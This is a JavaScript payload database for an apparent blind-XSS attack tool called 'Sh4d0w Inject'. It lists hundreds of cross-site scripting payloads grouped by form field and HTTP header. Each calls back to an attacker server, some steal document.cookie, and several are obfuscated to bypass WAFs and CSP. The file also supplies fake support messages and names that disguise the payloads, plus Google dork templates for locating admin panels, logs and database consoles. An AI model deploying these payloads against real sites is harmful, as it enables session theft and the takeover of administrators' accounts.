/**
 * Sh4d0w Inject — Payload Database v4.0
 * Clean, deduplicated, WAF-bypass optimized
 * {{SERVER}} = user's blind XSS callback URL
 * {{LOADER_B64}} = dynamically generated base64 at runtime
 *
 * v4.0 Changelog:
 * - 60+ new WAF bypass payloads (DOM Clobbering, mXSS, ES6, CSP bypass, Null Byte)
 * - 8 new header-specific payload pools
 * - 10+ expanded event handler payloads
 * - 12 new Google Dork templates for admin panels, dashboards, logs
 */

const BLINDXSS_PAYLOADS = {
  // ============================
  // Field type detection patterns
  // ============================
  fieldPatterns: {
    name: {
      keywords: ['name', 'first', 'last', 'full_name', 'fullname', 'firstname', 'lastname', 'fname', 'lname', 'username', 'user_name', 'nick', 'author'],
      inputTypes: ['text']
    },
    email: {
      keywords: ['email', 'e-mail', 'mail', 'correo'],
      inputTypes: ['email']
    },
    phone: {
      keywords: ['phone', 'tel', 'mobile', 'cell', 'fax', 'contact_number', 'phonenumber'],
      inputTypes: ['tel']
    },
    url: {
      keywords: ['url', 'website', 'site', 'link', 'homepage', 'web', 'href'],
      inputTypes: ['url']
    },
    subject: {
      keywords: ['subject', 'title', 'topic', 'heading', 'reason', 'regarding', 're', 'inquiry'],
      inputTypes: ['text']
    },
    message: {
      keywords: ['message', 'comment', 'feedback', 'description', 'body', 'content', 'text', 'details', 'inquiry', 'question', 'suggestion', 'complaint', 'review', 'note', 'remark', 'bio', 'about'],
      inputTypes: ['textarea']
    },
    address: {
      keywords: ['address', 'street', 'city', 'state', 'zip', 'postal', 'country', 'location', 'addr'],
      inputTypes: ['text']
    },
    company: {
      keywords: ['company', 'organization', 'org', 'business', 'employer', 'firm', 'institution'],
      inputTypes: ['text']
    },
    search: {
      keywords: ['search', 'query', 'q', 'keyword', 'find', 'lookup'],
      inputTypes: ['search', 'text']
    }
  },

  // ============================
  // Payloads by field type
  // {{SERVER}} = user's blind XSS callback
  // {{LOADER_B64}} = base64 of script loader (computed at runtime)
  // ============================
  payloadsByType: {
    name: [
      '\'"><script src={{SERVER}}></script>',
      'John"><details open ontoggle=fetch("{{SERVER}}")>',
      'Sarah"><img src=x onerror=import("{{SERVER}}")>',
      'Alex"><input onfocus=fetch("{{SERVER}}") autofocus>',
      '"><svg/onload="\\u0066\\u0065\\u0074\\u0063\\u0068`{{SERVER}}`">',
      // v4.0: New name payloads
      'Mike"><video src=x onerror=fetch("{{SERVER}}")>',
      'David"><iframe onload=fetch("{{SERVER}}") style=display:none>',
      'Chris"><marquee onstart=fetch("{{SERVER}}")>'
    ],

    email: [
      'test@"><script src={{SERVER}}></script>.com',
      'xss@test.com\'"><script src={{SERVER}}></script>',
      '"onfocus="fetch(\'{{SERVER}}\')"autofocus="@test.com',
      'test+\'"><script src={{SERVER}}></script>@gmail.com',
      '"><details open ontoggle=fetch("{{SERVER}}")>@test.com',
      'test@test.com"><img/src=x onerror=fetch("{{SERVER}}")>',
      'user@gmail.com<!--" --><script src={{SERVER}}></script>',
      'user@gmail.com"><svg onload=fetch("{{SERVER}}?c="+document.cookie)>',
      // v4.0: New email payloads
      'admin@"><body onpageshow=fetch("{{SERVER}}")>.com',
      'test@test.com"><object data="javascript:fetch(\'{{SERVER}}\')">',
      '"autofocus onfocus="fetch(\'{{SERVER}}\')" x="@test.com'
    ],

    phone: [
      '\'"><script src={{SERVER}}></script>',
      '1234567890"><img src=x onerror=fetch("{{SERVER}}")>',
      '+91"><details open ontoggle=fetch("{{SERVER}}")>',
      '0000"><svg/onload=fetch("{{SERVER}}")>',
      // v4.0: New phone payloads
      '+1"><marquee onstart=fetch("{{SERVER}}")>',
      '9999"><audio src=x onerror=fetch("{{SERVER}}")>'
    ],

    url: [
      'javascript:fetch("{{SERVER}}")',
      'https://test.com\'"><script src={{SERVER}}></script>',
      'https://"><img src=x onerror=fetch("{{SERVER}}")>',
      'javascript:import("{{SERVER}}")',
      // v4.0: New URL payloads
      'javascript:void(fetch("{{SERVER}}"))',
      'https://"><iframe onload=fetch("{{SERVER}}")>',
      'data:text/html,<script src="{{SERVER}}"></script>'
    ],

    subject: [
      'Inquiry\'"><script src={{SERVER}}></script>',
      'Question"><details open ontoggle=fetch("{{SERVER}}")>',
      'Bug Report"><img src=x onerror=fetch("{{SERVER}}")>',
      'Help Needed"><input onfocus=fetch("{{SERVER}}") autofocus>',
      // v4.0: New subject payloads
      'Urgent"><marquee onstart=fetch("{{SERVER}}")>',
      'Support"><svg><animate onbegin=fetch("{{SERVER}}") attributeName=x dur=1s>'
    ],

    message: [
      'Hi,\\n\\nI found your website and wanted to inquire about services.\\n\'"><script src={{SERVER}}></script>\\nPlease share pricing details.\\n\\nThanks,\\nJohn',

      'Hello,\\n\\nI\'m having trouble logging into my account.\\n\'"><script src={{SERVER}}></script>\\nMy email is john@test.com. Please help.\\n\\nRegards,\\nSarah',

      'Dear Team,\\n\\nI\'d like to report a bug I found.\\n"><details open ontoggle=fetch("{{SERVER}}")>\\nThe page crashes on mobile.\\n\\nThanks,\\nMike',

      'Hi Support,\\n\\nI was charged twice for order #4582.\\n"><img src=x onerror=fetch("{{SERVER}}")>\\nPlease issue a refund.\\n\\nThanks,\\nEmma',

      'Hello,\\n\\nInterested in enterprise pricing for 50 users.\\n"><svg/onload=fetch("{{SERVER}}")>\\nPlease schedule a call.\\n\\nCheers,\\nDavid',

      // v4.0: New message payloads with better camouflage
      'Hi there,\\n\\nI recently purchased your product and I\'m very happy with it.\\n\'"><script src={{SERVER}}></script>\\nJust wanted to leave a positive review.\\n\\nBest,\\nAlex',

      'Hello Team,\\n\\nCan you please update my shipping address for order #7891?\\n"><iframe srcdoc="<script src={{SERVER}}></script>">\\nNew address: 742 Evergreen Terrace.\\n\\nThanks,\\nLisa',

      'Dear Support,\\n\\nI noticed a broken link on your FAQ page.\\n"><img src=x id={{LOADER_B64}} onerror=eval(atob(this.id))>\\nJust thought you should know.\\n\\nRegards,\\nChris'
    ],

    address: [
      '123 Main St\'"><script src={{SERVER}}></script>',
      '456 Elm Ave"><details open ontoggle=fetch("{{SERVER}}")>',
      '789 Oak Blvd"><img src=x onerror=fetch("{{SERVER}}")>',
      // v4.0: New address payloads
      '321 Pine Rd"><svg/onload=fetch("{{SERVER}}")>',
      '555 Maple Dr"><input onfocus=fetch("{{SERVER}}") autofocus>'
    ],

    company: [
      'Tech Solutions Inc\'"><script src={{SERVER}}></script>',
      'Digital Corp"><details open ontoggle=fetch("{{SERVER}}")>',
      'Cloud Nine Ltd"><img src=x onerror=fetch("{{SERVER}}")>',
      // v4.0: New company payloads
      'Global Systems"><svg/onload=fetch("{{SERVER}}")>',
      'Nexus Labs"><marquee onstart=fetch("{{SERVER}}")>'
    ],

    search: [
      '\'"><script src={{SERVER}}></script>',
      '"><img src=x onerror=fetch("{{SERVER}}")>',
      '"><details/open/ontoggle=fetch`{{SERVER}}`>',
      // v4.0: New search payloads
      '"><svg><animate onbegin=fetch("{{SERVER}}") attributeName=x dur=1s>',
      '"><input onfocus=fetch("{{SERVER}}") autofocus>'
    ],

    // v4.0.1: Hidden inputs — server-side Blind XSS goldmine
    // These values are logged in admin panels, databases, and analytics dashboards
    // without sanitization because devs assume hidden fields are "safe"
    hidden: [
      '\'"><script src={{SERVER}}></script>',
      '"><img src=x onerror=fetch("{{SERVER}}")>',
      '"><svg/onload=fetch("{{SERVER}}")>',
      '"><details open ontoggle=fetch("{{SERVER}}")>',
      '<script>fetch("{{SERVER}}?c="+document.cookie)</script>',
      '"><iframe srcdoc="<script src={{SERVER}}></script>">',
      '"><ScRiPt src={{SERVER}}></ScRiPt>',
      '"><img src=x id={{LOADER_B64}} onerror=eval(atob(this.id))>',
      // Tag breaker polyglots (hidden values often rendered in HTML contexts)
      '\'"></title></textarea></script></style></noscript><script src={{SERVER}}></script>',
      '--></tiTle></stYle></texTarea></scrIpt>"/\'//><scrIpt src={{SERVER}}></scrIpt>',
      // Constructor chain (for JS template contexts)
      '{constructor.constructor(\'fetch("{{SERVER}}")\')()}',
      // Navigator beacon (fires even if page is closing)
      '<script>navigator.sendBeacon("{{SERVER}}",document.cookie)</script>'
    ],

    generic: [
      // === Level 1: Direct Script Injection ===
      '\'"><script src={{SERVER}}></script>',

      // === Level 2: Event Handlers ===
      '"><details open ontoggle=fetch("{{SERVER}}")>',
      '"><img src=x onerror=fetch("{{SERVER}}")>',
      '"><input onfocus=fetch("{{SERVER}}") autofocus>',
      '"><video src=x onerror=fetch("{{SERVER}}")>',
      '"><svg/onload=fetch("{{SERVER}}")>',
      '"><audio src=x onerror=fetch("{{SERVER}}")>',

      // === Level 3: Base64/atob WAF Bypass (dynamic) ===
      '"><img src=x id={{LOADER_B64}} onerror=eval(atob(this.id))>',
      '"><input onfocus=eval(atob(this.id)) id={{LOADER_B64}} autofocus>',
      '"><video><source onerror=eval(atob(this.id)) id={{LOADER_B64}}>',

      // === Level 4: Dynamic Script Creation ===
      '<script>var a=document.createElement("script");a.src="{{SERVER}}";document.body.appendChild(a);</script>',
      '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "{{SERVER}}");a.send();</script>',

      // === Level 5: Case & Encoding Bypass ===
      '"><ScRiPt src={{SERVER}}></ScRiPt>',
      '"><svg/onload="\\u0066\\u0065\\u0074\\u0063\\u0068`{{SERVER}}`">',

      // === Level 6: Tag Breaker Polyglots ===
      '--></tiTle></stYle></texTarea></scrIpt>"/\'//><scrIpt src={{SERVER}}></scrIpt>',
      '\'"></title></textarea></script></style></noscript><script src={{SERVER}}></script>',
      '/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script>"/\'//><scrIpt src="{{SERVER}}"></scrIpt>',

      // === Level 7: iframe srcdoc ===
      '"><iframe srcdoc="<script src={{SERVER}}></script>">',
      '</script><Iframe SrcDoc="><script src={{SERVER}}></script>">',

      // === Level 8: JS Tricks & Constructor Chain ===
      '"><img src=x onerror="self[`fet`+`ch`](`{{SERVER}}`)">',
      '{constructor.constructor(\'fetch("{{SERVER}}")\')()}',
      '{globalThis.constructor("fetch(\'{{SERVER}}?c=\'+document.cookie)")()}',

      // === Level 9: SVG import() ===
      '-\'"><Svg Src={{SERVER}} OnLoad=import(this.getAttribute(\'src\')+0)>',
      '\'"><Img Src={{SERVER}} Onload=import(src+0)>',

      // === Level 10: setTimeout + fromCharCode ===
      '\'"><img src=x onerror=setTimeout(String.fromCharCode(102,101,116,99,104)+\'("{{SERVER}}")\', 0)>',

      // === Level 11: SVG Animate ===
      '"><svg><animate onbegin=fetch("{{SERVER}}") attributeName=x dur=1s>',

      // === Level 12: Math/Table Nesting ===
      '"><math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch("{{SERVER}}")>',

      // === Level 13: createElement inject ===
      '\\"></script><img src=x onerror="with(document)body.appendChild(createElement(\'script\')).src=\'{{SERVER}}\'">',

      // === Level 14: Double Payload ===
      '\'"><script src={{SERVER}}></script><img src=x onerror=fetch(\'{{SERVER}}?c=\'+document.cookie)>',

      // ============================================
      // v4.0 NEW PAYLOADS — Advanced WAF Bypass
      // ============================================

      // === Level 15: DOM Clobbering ===
      '"><form id=x><input name=innerHTML><img src=x onerror=fetch("{{SERVER}}")>',
      '"><a id=output><a id=output name=url href="javascript:fetch(\'{{SERVER}}\')">click',
      '"><form><button formaction="javascript:fetch(\'{{SERVER}}\')">Submit',

      // === Level 16: Mutation XSS (mXSS) ===
      '"><math><mtext><table><thead></thead><style><!--</style><img src=x onerror=fetch("{{SERVER}}")>',
      '"><svg><desc><table><thead><style>/*</style><img src=x onerror=fetch("{{SERVER}}")>',
      '"><noscript><p title="</noscript><img src=x onerror=fetch(\'{{SERVER}}\')>">',
      '"><xmp><p title="</xmp><img src=x onerror=fetch(\'{{SERVER}}\')>">',

      // === Level 17: ES6 Template Literal & Backtick Tricks ===
      '"><img src=x onerror=fetch`{{SERVER}}`>',
      '"><svg onload=fetch`{{SERVER}}`>',
      '"><img src=x onerror="[].find.call`${fetch`{{SERVER}}`}`">',
      '"><img src=x onerror=import(`{{SERVER}}`)>',

      // === Level 18: URL-Encoded Double Bypass ===
      '%27%22%3E%3Cscript%20src%3D{{SERVER}}%3E%3C%2Fscript%3E',
      '%22%3E%3Csvg%2Fonload%3Dfetch%28%22{{SERVER}}%22%29%3E',
      '%22%3E%3Cimg%20src%3Dx%20onerror%3Dfetch%28%22{{SERVER}}%22%29%3E',

      // === Level 19: Null Byte & Encoding Tricks ===
      '"><img src=x onerror=\\u0066etch("{{SERVER}}")>',
      '"><img src=x onerror="\\x66etch(\'{{SERVER}}\')">',
      '"><img src=x onerror="\\u0066\\u0065\\u0074\\u0063\\u0068(\'{{SERVER}}\')">',

      // === Level 20: Expanded Event Handlers ===
      '"><body onpageshow=fetch("{{SERVER}}")>',
      '"><marquee onstart=fetch("{{SERVER}}")>',
      '"><object data="javascript:fetch(\'{{SERVER}}\')">',
      '"><embed src="javascript:fetch(\'{{SERVER}}\')">',
      '"><iframe onload=fetch("{{SERVER}}")>',
      '"><select onfocus=fetch("{{SERVER}}") autofocus>',
      '"><textarea onfocus=fetch("{{SERVER}}") autofocus></textarea>',
      '"><button onfocus=fetch("{{SERVER}}") autofocus>',
      '"><meter onmouseover=fetch("{{SERVER}}")>0</meter>',
      '"><a href="javascript:fetch(\'{{SERVER}}\')">click here</a>',

      // === Level 21: CSP Bypass Vectors ===
      '"><meta http-equiv="refresh" content="0;url=javascript:fetch(\'{{SERVER}}\')">',
      '"><link rel=import href="{{SERVER}}">',
      '"><base href="{{SERVER}}">',
      '"><script>navigator.sendBeacon("{{SERVER}}",document.cookie)</script>',

      // === Level 22: Recursive Tag Confusion ===
      '"><title><img src=x onerror=fetch("{{SERVER}}")></title>',
      '"><style><img src=x onerror=fetch("{{SERVER}}")></style>',
      '"><noembed><img src=x onerror=fetch("{{SERVER}}")></noembed>',

      // === Level 23: Window/Top/Parent Tricks ===
      '"><img src=x onerror="top[`fe`+`tch`](`{{SERVER}}`)">',
      '"><img src=x onerror="window[`\\x66etch`](`{{SERVER}}`)">',
      '"><img src=x onerror="self[atob(`ZmV0Y2g=`)](`{{SERVER}}`)">'
    ]
  },

  // ============================
  // Per-Header XSS Injection Payloads
  // ============================
  headerPayloads: {
    'user-agent': [
      // === Direct script inject (PROVEN) ===
      'Mozilla/5.0\'"><script src={{SERVER}}></script>',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64)\'"><script src={{SERVER}}></script>',
      'Mozilla/5.0 (X11; Linux x86_64)\'"><script src={{SERVER}}></script>',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\'"><script src={{SERVER}}></script>',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)\'"><script src={{SERVER}}></script>',

      // === Event handler variants ===
      'Mozilla/5.0"><img src=x onerror=fetch("{{SERVER}}")>',
      'Mozilla/5.0"><svg/onload=fetch("{{SERVER}}")>',
      'Mozilla/5.0"><details open ontoggle=fetch("{{SERVER}}")>',
      'Mozilla/5.0"><input onfocus=fetch("{{SERVER}}") autofocus>',
      'Mozilla/5.0"><video src=x onerror=fetch("{{SERVER}}")>',
      'Mozilla/5.0"><audio src=x onerror=fetch("{{SERVER}}")>',

      // === WAF bypass variants ===
      'Mozilla/5.0"><ScRiPt src={{SERVER}}></ScRiPt>',
      'Mozilla/5.0"><iframe srcdoc="<script src={{SERVER}}></script>">',
      'Mozilla/5.0"><img src=x id={{LOADER_B64}} onerror=eval(atob(this.id))>',
      'Mozilla/5.0"><svg/onload="\\u0066\\u0065\\u0074\\u0063\\u0068`{{SERVER}}`">',
      'Mozilla/5.0 (compatible)\'"><Svg Src={{SERVER}} OnLoad=import(this.getAttribute(\'src\')+0)>',

      // === Tag breaker polyglots ===
      'Mozilla/5.0\'"></title></textarea></script></noscript><script src={{SERVER}}></script>',
      'Mozilla/5.0 --></tiTle></stYle></texTarea></scrIpt>"/\'//><scrIpt src={{SERVER}}></scrIpt>',

      // === Constructor chain ===
      'Mozilla/5.0">{constructor.constructor(\'fetch("{{SERVER}}")\')()}',

      // v4.0: New UA payloads
      'Mozilla/5.0"><marquee onstart=fetch("{{SERVER}}")>',
      'Mozilla/5.0"><object data="javascript:fetch(\'{{SERVER}}\')">',
      'Mozilla/5.0"><img src=x onerror=import(`{{SERVER}}`)>'
    ],

    'referer': [
      'https://evil.com/\'"><script src={{SERVER}}></script>',
      'https://evil.com/"><img src=x onerror=fetch("{{SERVER}}")>',
      'https://evil.com/"><svg/onload=fetch("{{SERVER}}")>',
      'https://evil.com/"><details open ontoggle=fetch("{{SERVER}}")>',
      'https://google.com/search?q=\'"><script src={{SERVER}}></script>',
      'https://evil.com/"><svg><animate onbegin=fetch("{{SERVER}}") attributeName=x dur=1s>',
      // v4.0: New referer payloads
      'https://evil.com/"><iframe srcdoc="<script src={{SERVER}}></script>">',
      'https://evil.com/"><marquee onstart=fetch("{{SERVER}}")>',
      'https://evil.com/"><img src=x id={{LOADER_B64}} onerror=eval(atob(this.id))>'
    ],

    'origin': [
      '\'"><script src={{SERVER}}></script>',
      'https://evil.com\'"><img src=x onerror=fetch("{{SERVER}}")>',
      'null\'"><script src={{SERVER}}></script>',
      '"><svg/onload=fetch("{{SERVER}}")>',
      '"><details open ontoggle=fetch("{{SERVER}}")>',
      // v4.0: New origin payloads
      '"><iframe srcdoc="<script src={{SERVER}}></script>">',
      '"><marquee onstart=fetch("{{SERVER}}")>'
    ],

    'cookie': [
      'session=\'"><script src={{SERVER}}></script>',
      'auth="><img src=x onerror=fetch("{{SERVER}}")>',
      'pref="><svg/onload=fetch("{{SERVER}}")>',
      'user="><input onfocus=fetch`{{SERVER}}` autofocus>',
      'debug=true; xss=\'"><script src={{SERVER}}></script>',
      // v4.0: New cookie payloads
      'lang="><details open ontoggle=fetch("{{SERVER}}")>',
      'theme="><marquee onstart=fetch("{{SERVER}}")>',
      'token="><iframe srcdoc="<script src={{SERVER}}></script>">'
    ],

    'accept': [
      'text/html\'"><script src={{SERVER}}></script>',
      'text/html"><img src=x onerror=fetch("{{SERVER}}")>',
      '*/*"><details open ontoggle=fetch("{{SERVER}}")>',
      'text/html"><svg/onload=fetch("{{SERVER}}")>',
      // v4.0: New accept payloads
      'application/json"><iframe srcdoc="<script src={{SERVER}}></script>">',
      'text/xml"><marquee onstart=fetch("{{SERVER}}")>'
    ],

    'x-forwarded-for': [
      '127.0.0.1\'"><script src={{SERVER}}></script>',
      '192.168.1.1"><img src=x onerror=fetch("{{SERVER}}")>',
      '10.0.0.1"><svg/onload=fetch("{{SERVER}}")>',
      '172.16.0.1"><details open ontoggle=fetch("{{SERVER}}")>',
      '127.0.0.1"><ScRiPt src={{SERVER}}></ScRiPt>',
      '127.0.0.1"><svg><animate onbegin=fetch("{{SERVER}}") attributeName=x dur=1s>',
      // v4.0: New XFF payloads
      '::1\'"><script src={{SERVER}}></script>',
      '10.0.0.1"><iframe srcdoc="<script src={{SERVER}}></script>">',
      '192.168.0.1"><img src=x id={{LOADER_B64}} onerror=eval(atob(this.id))>'
    ],

    // ============================================
    // v4.0 NEW HEADER PAYLOAD POOLS
    // ============================================

    'x-real-ip': [
      '127.0.0.1\'"><script src={{SERVER}}></script>',
      '::1"><img src=x onerror=fetch("{{SERVER}}")>',
      '10.0.0.1"><svg/onload=fetch("{{SERVER}}")>',
      '192.168.1.1"><details open ontoggle=fetch("{{SERVER}}")>',
      '172.16.0.1"><ScRiPt src={{SERVER}}></ScRiPt>',
      '127.0.0.1"><iframe srcdoc="<script src={{SERVER}}></script>">',
      '10.10.10.1"><marquee onstart=fetch("{{SERVER}}")>'
    ],

    'true-client-ip': [
      '127.0.0.1\'"><script src={{SERVER}}></script>',
      '::1"><img src=x onerror=fetch("{{SERVER}}")>',
      '10.0.0.1"><svg/onload=fetch("{{SERVER}}")>',
      '192.168.1.1"><details open ontoggle=fetch("{{SERVER}}")>',
      '172.16.0.1"><input onfocus=fetch("{{SERVER}}") autofocus>',
      '10.0.0.1"><ScRiPt src={{SERVER}}></ScRiPt>',
      '::1"><img src=x id={{LOADER_B64}} onerror=eval(atob(this.id))>'
    ],

    'x-client-ip': [
      '127.0.0.1\'"><script src={{SERVER}}></script>',
      '192.168.0.1"><img src=x onerror=fetch("{{SERVER}}")>',
      '10.10.10.1"><svg/onload=fetch("{{SERVER}}")>',
      '172.16.0.1"><details open ontoggle=fetch("{{SERVER}}")>',
      '::1"><video src=x onerror=fetch("{{SERVER}}")>',
      '10.0.0.1"><iframe srcdoc="<script src={{SERVER}}></script>">'
    ],

    'x-originating-ip': [
      '127.0.0.1\'"><script src={{SERVER}}></script>',
      '[127.0.0.1]"><img src=x onerror=fetch("{{SERVER}}")>',
      '10.0.0.1"><svg/onload=fetch("{{SERVER}}")>',
      '192.168.1.1"><details open ontoggle=fetch("{{SERVER}}")>',
      '::1"><marquee onstart=fetch("{{SERVER}}")>',
      '172.16.0.1"><ScRiPt src={{SERVER}}></ScRiPt>'
    ],

    'contact': [
      'admin@test.com\'"><script src={{SERVER}}></script>',
      'security@test.com"><img src=x onerror=fetch("{{SERVER}}")>',
      'info@evil.com"><svg/onload=fetch("{{SERVER}}")>',
      'support@test.com"><details open ontoggle=fetch("{{SERVER}}")>',
      'noreply@test.com"><iframe srcdoc="<script src={{SERVER}}></script>">'
    ],

    'from': [
      'admin@test.com\'"><script src={{SERVER}}></script>',
      'user@evil.com"><img src=x onerror=fetch("{{SERVER}}")>',
      'scanner@test.com"><svg/onload=fetch("{{SERVER}}")>',
      'bot@test.com"><details open ontoggle=fetch("{{SERVER}}")>',
      'noreply@evil.com"><marquee onstart=fetch("{{SERVER}}")>',
      'test@test.com"><input onfocus=fetch("{{SERVER}}") autofocus>'
    ],

    'x-wap-profile': [
      'http://evil.com/profile.xml\'"><script src={{SERVER}}></script>',
      'http://evil.com/wap"><img src=x onerror=fetch("{{SERVER}}")>',
      'http://evil.com/"><svg/onload=fetch("{{SERVER}}")>',
      'http://evil.com/p"><details open ontoggle=fetch("{{SERVER}}")>',
      'http://evil.com/x"><ScRiPt src={{SERVER}}></ScRiPt>',
      'http://evil.com/w"><iframe srcdoc="<script src={{SERVER}}></script>">'
    ],

    'x-custom-ip-authorization': [
      '127.0.0.1\'"><script src={{SERVER}}></script>',
      'admin"><img src=x onerror=fetch("{{SERVER}}")>',
      'root"><svg/onload=fetch("{{SERVER}}")>',
      'internal"><details open ontoggle=fetch("{{SERVER}}")>',
      'bypass"><ScRiPt src={{SERVER}}></ScRiPt>',
      'trusted"><iframe srcdoc="<script src={{SERVER}}></script>">'
    ],

    'generic': [
      '\'"><script src={{SERVER}}></script>',
      '"><img src=x onerror=fetch("{{SERVER}}")>',
      '"><details open ontoggle=fetch("{{SERVER}}")>',
      '"><svg/onload=fetch("{{SERVER}}")>',
      // v4.0: Enhanced generic
      '"><marquee onstart=fetch("{{SERVER}}")>',
      '"><iframe srcdoc="<script src={{SERVER}}></script>">'
    ]
  },

  // ============================
  // Polyglot Payloads
  // ============================
  polyglots: [
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=fetch(`{{SERVER}}`) )//%0D%0A//',
    '\'"><img src=x onerror=fetch("{{SERVER}}")>//',
    '--></script></noscript></title></textarea></style></template></noembed><script src={{SERVER}}></script>',
    '{{constructor.constructor("fetch(\'{{SERVER}}\')  ")()}}',
    '<x/onpointerrawupdate=fetch`{{SERVER}}`>Click me</x>',
    // v4.0: New polyglots
    '\'"`><script>/*<svg/*/onload=\'/**/fetch("{{SERVER}}")//\'>',
    '\\\'\\"><ScRiPt>fetch("{{SERVER}}")</ScRiPt>',
    'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><svg/onload=fetch`{{SERVER}}`>//'
  ],

  // ============================
  // Realistic camouflage data
  // ============================
  randomData: {
    names: ['John Smith', 'Sarah Johnson', 'Mike Williams', 'Emma Brown', 'David Wilson', 'Lisa Anderson', 'Chris Taylor', 'Anna Martinez', 'James Garcia', 'Rachel Miller', 'Robert Davis', 'Jennifer Lopez', 'William Moore', 'Amanda Clark', 'Thomas White'],
    domains: ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com', 'hotmail.com', 'icloud.com', 'aol.com'],
    subjects: ['Inquiry about services', 'Support Request', 'Question about pricing', 'Partnership opportunity', 'Feedback on product', 'General inquiry', 'Help needed', 'Feature request', 'Billing question', 'Account issue', 'Refund request'],
    companies: ['Tech Solutions Inc', 'Digital Services LLC', 'Global Corp', 'NextGen Systems', 'Cloud Nine Ltd', 'Innovate Pro', 'DataFlow Inc', 'CyberEdge Labs', 'Apex Digital', 'Nova Technologies']
  },

  // ============================
  // Google Dork templates
  // ============================
  dorkTemplates: [
    // === Original Dorks ===
    { label: '📋 Contact Forms', dork: 'site:{{DOMAIN}} inurl:contact' },
    { label: '📋 Contact Us Page', dork: 'site:{{DOMAIN}} intitle:"contact us"' },
    { label: '📋 Contact (subdomains)', dork: 'site:*.{{DOMAIN}} inurl:contact' },
    { label: '💬 Feedback Forms', dork: 'site:{{DOMAIN}} inurl:feedback' },
    { label: '🎫 Support/Tickets', dork: 'site:{{DOMAIN}} inurl:support OR inurl:ticket OR inurl:helpdesk' },
    { label: '💭 Comment Sections', dork: 'site:{{DOMAIN}} inurl:comment OR inurl:blog OR inurl:post' },
    { label: '📝 Registration/Signup', dork: 'site:{{DOMAIN}} inurl:register OR inurl:signup OR inurl:join' },
    { label: '🔐 Login Pages', dork: 'site:{{DOMAIN}} inurl:login OR inurl:signin OR inurl:auth' },
    { label: '📄 Submit Forms', dork: 'site:{{DOMAIN}} inurl:submit OR inurl:form OR inurl:inquiry' },
    { label: '⭐ Reviews', dork: 'site:{{DOMAIN}} inurl:review OR inurl:testimonial OR inurl:rate' },
    { label: '😤 Complaints', dork: 'site:{{DOMAIN}} inurl:complaint OR inurl:report OR inurl:grievance' },
    { label: '📧 Newsletter', dork: 'site:{{DOMAIN}} inurl:subscribe OR inurl:newsletter' },
    { label: '🔍 Search Pages', dork: 'site:{{DOMAIN}} inurl:search OR inurl:query OR inurl:"q="' },
    { label: '👤 Profile/Settings', dork: 'site:{{DOMAIN}} inurl:profile OR inurl:settings OR inurl:account' },
    { label: '📤 Upload Forms', dork: 'site:{{DOMAIN}} inurl:upload OR inurl:attach OR inurl:file' },
    { label: '🏢 Career/Apply', dork: 'site:{{DOMAIN}} inurl:career OR inurl:apply OR inurl:jobs' },
    { label: '📊 Survey/Poll', dork: 'site:{{DOMAIN}} inurl:survey OR inurl:poll OR inurl:questionnaire' },
    { label: '🔄 All Input Pages', dork: 'site:*.{{DOMAIN}} intitle:"contact" OR intitle:"feedback" OR intitle:"support"' },

    // === v4.0 NEW DORKS — BXSS Goldmine Targets ===
    { label: '🛡️ Admin Panels', dork: 'site:{{DOMAIN}} inurl:admin OR inurl:administrator OR inurl:cpanel' },
    { label: '📊 Dashboards', dork: 'site:{{DOMAIN}} inurl:dashboard OR inurl:portal OR inurl:console' },
    { label: '📜 Log Viewers', dork: 'site:{{DOMAIN}} inurl:log OR inurl:logs OR inurl:audit' },
    { label: '📈 Report Pages', dork: 'site:{{DOMAIN}} inurl:report OR inurl:analytics OR inurl:stats' },
    { label: '🔌 API Endpoints', dork: 'site:{{DOMAIN}} inurl:api OR inurl:swagger OR inurl:graphql' },
    { label: '🪝 Webhook Config', dork: 'site:{{DOMAIN}} inurl:webhook OR inurl:callback OR inurl:notify' },
    { label: '⚙️ PHP with Params', dork: 'site:{{DOMAIN}} ext:php inurl:?' },
    { label: '🐛 Debug/Diagnostic', dork: 'site:{{DOMAIN}} inurl:debug OR inurl:trace OR inurl:diagnostic' },
    { label: '🔧 Status/Monitoring', dork: 'site:{{DOMAIN}} inurl:status OR inurl:health OR inurl:monitor' },
    { label: '🎛️ Control Panels', dork: 'site:{{DOMAIN}} inurl:panel OR inurl:manage OR inurl:cms' },
    { label: '💾 Database/PHPMyAdmin', dork: 'site:{{DOMAIN}} inurl:phpmyadmin OR inurl:adminer OR inurl:dbadmin' },
    { label: '🚨 Error/Exception Pages', dork: 'site:{{DOMAIN}} intitle:"error" OR intitle:"exception" OR intitle:"500"' }
  ]
};

// Make available in both contexts
if (typeof window !== 'undefined') {
  window.BLINDXSS_PAYLOADS = BLINDXSS_PAYLOADS;
}
